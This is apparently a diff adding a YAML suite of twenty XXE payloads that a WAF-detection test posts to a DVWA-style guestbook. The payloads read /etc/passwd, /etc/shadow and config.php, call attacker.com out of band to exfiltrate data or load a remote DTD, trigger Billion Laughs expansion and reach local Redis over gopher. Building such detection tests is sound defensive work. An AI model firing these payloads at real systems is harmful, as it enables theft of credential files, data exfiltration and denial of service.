@@ -1,0 +1,201 @@
+# =============================================================================
+# XXE (XML External Entity) Test Cases
+# =============================================================================
+# XML External Entity Injection 공격을 통해 WAF 탐지 능력을 검증합니다.
+# In-band XXE, Out-of-band XXE, Blind XXE, XXE via file upload 등 포함
+# =============================================================================
+
+category: "xxe"
+name: "XML External Entity"
+description: "XXE (XML External Entity) 공격 탐지 테스트"
+severity: "critical"
+icon: "📄"
+
+tests:
+  # --- In-band XXE (파일 읽기) ---
+  - id: "xxe-001"
+    description: "XXE - /etc/passwd 읽기"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "xxe-002"
+    description: "XXE - /etc/shadow 읽기"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "xxe-003"
+    description: "XXE - 소스코드 읽기 (PHP wrapper)"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=config.php\">]><root>&xxe;</root>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "xxe-004"
+    description: "XXE - 디렉토리 리스팅"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///\">]><root>&xxe;</root>"
+      btnSign: "Sign Guestbook"
+    severity: "high"
+
+  # --- Out-of-band XXE (OOB) ---
+  - id: "xxe-005"
+    description: "XXE OOB - HTTP 외부 연결"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://attacker.com/exfil\">]><root>&xxe;</root>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "xxe-006"
+    description: "XXE OOB - FTP 외부 연결"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"ftp://attacker.com/exfil\">]><root>&xxe;</root>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "xxe-007"
+    description: "XXE OOB - 파라미터 엔티티 (DTD 외부 참조)"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><root>&data;</root>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  # --- Blind XXE ---
+  - id: "xxe-008"
+    description: "Blind XXE - Error-based 정보추출"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">%eval;%error;]><root>test</root>"
+      btnSign: "Sign Guestbook"
+    severity: "high"
+
+  - id: "xxe-009"
+    description: "Blind XXE - Out-of-band 핑 (sleep 유도)"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/ping\"> %xxe;]><root>test</root>"
+      btnSign: "Sign Guestbook"
+    severity: "high"
+
+  # --- XXE via XInclude ---
+  - id: "xxe-010"
+    description: "XXE - XInclude /etc/passwd"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></root>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  # --- XXE via SVG ---
+  - id: "xxe-011"
+    description: "XXE - SVG 파일 읽기"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg width=\"100\" height=\"100\"><text x=\"10\" y=\"20\">&xxe;</text></svg>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "xxe-012"
+    description: "XXE - SVG + OOB"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"http://attacker.com/steal\">]><svg>&xxe;</svg>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  # --- XXE via SOAP ---
+  - id: "xxe-013"
+    description: "XXE - SOAP 요청"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE soap [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Body><foo>&xxe;</foo></soap:Body>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  # --- XXE 우회 기법 ---
+  - id: "xxe-014"
+    description: "XXE - UTF-7 인코딩 우회"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\" encoding=\"UTF-7\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"
+      btnSign: "Sign Guestbook"
+    severity: "medium"
+
+  - id: "xxe-015"
+    description: "XXE - 엔티티 확장 (Billion Laughs DoS)"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;&lol2;\"><!ENTITY lol4 \"&lol3;&lol3;&lol3;\">]><root>&lol4;</root>"
+      btnSign: "Sign Guestbook"
+    severity: "medium"
+
+  - id: "xxe-016"
+    description: "XXE - CDATA 래핑"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><![CDATA[&xxe;]]></root>"
+      btnSign: "Sign Guestbook"
+    severity: "medium"
+
+  # --- XXE via JavaScript/XHR ---
+  - id: "xxe-017"
+    description: "XXE - Java 비활성화 엔티티"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">%remote;]>"
+      btnSign: "Sign Guestbook"
+    severity: "high"
+
+  - id: "xxe-018"
+    description: "XXE - SSRF 조합 (내부 Redis 접근)"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"gopher://127.0.0.1:6379/_PING\">]><root>&xxe;</root>"
+      btnSign: "Sign Guestbook"
+    severity: "critical"
+
+  - id: "xxe-019"
+    description: "XXE - DocType 없이 ENTITY 직접 선언"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>"
+      btnSign: "Sign Guestbook"
+    severity: "high"
+
+  - id: "xxe-020"
+    description: "XXE - 경로 순회 조합 (../../etc/passwd)"
+    method: "POST"
+    path: "/vulnerabilities/xss_s/"
+    params:
+      txtName: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///var/www/../../etc/passwd\">]><root>&xxe;</root>"
+      btnSign: "Sign Guestbook"
+    severity: "high"
